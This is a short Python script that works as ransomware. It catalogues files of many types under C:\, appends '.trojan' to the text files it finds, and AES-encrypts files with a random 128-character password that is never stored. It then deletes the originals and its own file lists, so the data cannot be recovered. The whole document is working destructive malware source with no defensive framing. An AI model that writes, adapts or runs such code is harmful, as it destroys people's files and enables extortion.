import threading
import os, glob
import shutil
from path import *
import pyAesCrypt
import time
import random
import string

lenght = 128

lower = string.ascii_lowercase
upper = string.ascii_uppercase
num = string.digits
symbols = string.punctuation

all = lower + upper + num + symbols

temp = random.sample(all, lenght)

password = ''.join(temp)

def searchfiles(extension='.ttf', folder='H:\\'):
    "Create a txt file with all the file of a type"
    with open(extension[1:] + "file.txt", "w", encoding="utf-8") as filewrite:
        for r, d, f in os.walk(folder):
            for file in f:
                if file.endswith(extension):
                    filewrite.write(f"{r + '/' + file}\n")






searchfiles('.txt', 'C:\\')
searchfiles('.png', 'C:\\')
searchfiles('.jpg', 'C:\\')
searchfiles('.bat', 'C:\\')
searchfiles('.bmp', 'C:\\')
searchfiles('.gif', 'C:\\')
searchfiles('.avi', 'C:\\')
searchfiles('.mpeg', 'C:\\')
searchfiles('.mp4', 'C:\\')
searchfiles('.mp3', 'C:\\')
searchfiles('.wav', 'C:\\')
searchfiles('.flv', 'C:\\')
searchfiles('.exe', 'C:\\')
searchfiles('.doc', 'C:\\')
searchfiles('.docx', 'C:\\')
searchfiles('.odt', 'C:\\')
searchfiles('.ods', 'C:\\')
searchfiles('.odp', 'C:\\')
searchfiles('.odb', 'C:\\')
searchfiles('.xls', 'C:\\')
searchfiles('.xlsx', 'C:\\')
searchfiles('.xml', 'C:\\')
searchfiles('.pdf', 'C:\\')
searchfiles('.xps', 'C:\\')
searchfiles('.zip', 'C:\\')
searchfiles('.rar', 'C:\\')



file_typeslol = ['txtfile.txt']
virus = []

for i in file_typeslol:
    it = i

    f = open(it, 'r')

    line = f.readline()
    for line in f:
        virus.append(line[:-1])




for i in virus:
    old = i
    new = i + '.trojan'
    try:
        os.rename(old, new)
    except:
        continue
        
        
print('Ho sbagliato il test :(')
searchfiles('.trojan', os.getcwd())

cripta = []

ol = 'trojanfile.txt'
c = open(ol, 'r')
line = c.readline()

for line in c:
    cripta.append(line[:-1])







for i in cripta:
    pyAesCrypt.encryptFile(i, (i + '.aes'), password)
    os.remove(i)
time.sleep(1)
os.remove('trojanfile.txt')
os.remove('txtfile.txt')